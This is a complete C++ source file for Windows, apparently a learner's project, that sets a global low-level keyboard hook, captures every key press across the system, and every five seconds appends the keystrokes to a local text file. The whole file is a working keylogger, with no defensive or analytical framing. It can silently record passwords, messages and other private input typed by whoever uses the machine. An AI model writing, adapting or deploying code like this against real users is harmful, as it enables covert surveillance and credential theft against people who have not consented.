#include <iostream>
#include <windows.h>
#include <string>
#include <fstream> 
#include <thread>
#include <mutex>

HHOOK keyboardHook = NULL;
std::wstring keystrokeBuffer;
std::mutex bufferMutex; 

void WriteBufferToFile() {
    std::wofstream outFile("keystrokes.txt", std::ios::app);
    if (!outFile.is_open()) {
        std::cerr << "Failed to open file for writing: " << GetLastError();
        return; 
    } 
    std::lock_guard<std::mutex> guard(bufferMutex);
    outFile << keystrokeBuffer;
    keystrokeBuffer.clear();
    outFile.close();
}

void PeriodicBufferFlush() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5)); //Flush every 5 secs.
        WriteBufferToFile();
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = kbdStruct->vkCode;
            DWORD scanCode = kbdStruct->scanCode;
            DWORD flags = kbdStruct->flags; 
            wchar_t buffer[256] = {0};
            BYTE keyboardState[256];

            if (GetKeyboardState(keyboardState)) {
                int unicodeStatus = ToUnicode(vkCode, scanCode, keyboardState, buffer, 255, flags); 
                // Do more reseach on this function, why we need all the parameters.  
                // std::cout << "unicodestatus: " << unicodeStatus << "\n";

                if (unicodeStatus > 0) {
                    std::lock_guard<std::mutex> guard(bufferMutex);
                    keystrokeBuffer += buffer[0];
                    //std::wcout << L"The character: " << buffer[0] << L" was pressed. \n"; 
                }
                else {
                    std::lock_guard<std::mutex> guard(bufferMutex);
                    keystrokeBuffer += L"[VK:" + std::to_wstring(vkCode) + L"]";
                    //std::cout << "The key " << vkCode << " was pressed" << std::endl;
                }

            }  else {
                std::cerr << "Failed to get keyboard state: " << GetLastError();
            }
        } 
    }
        
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam); 
}


int main() {
    std::thread flushThread(PeriodicBufferFlush);
    flushThread.detach(); // Run the flushThread thread independently from the main thread. 
    
    // Install keyboard hook.
    keyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        KeyboardProc, 
        GetModuleHandle(NULL),
        0);

    // Handle error if we fail to install hook.
    if (keyboardHook == NULL) {
        std::cerr << "(-) failed to install hook: " << GetLastError() << std::endl;
        return 1;
    }


    // Message loop: Dispatch messages generated from the events in the hook 
    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Unsintall hooks.
    UnhookWindowsHookEx(keyboardHook);

    return 0;
};